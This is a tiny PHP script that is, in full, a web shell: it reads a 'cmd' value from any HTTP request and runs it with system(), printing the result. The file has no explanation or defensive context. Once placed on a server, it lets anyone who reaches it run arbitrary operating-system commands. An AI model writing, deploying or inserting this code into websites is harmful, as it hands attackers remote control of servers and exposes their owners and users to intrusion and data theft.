<?php
$cmd = $_REQUEST['cmd'];
if (isset($cmd)){
	echo "<pre><div align=\"left\">";
	system($cmd);
	echo "</div></pre>";
}
?>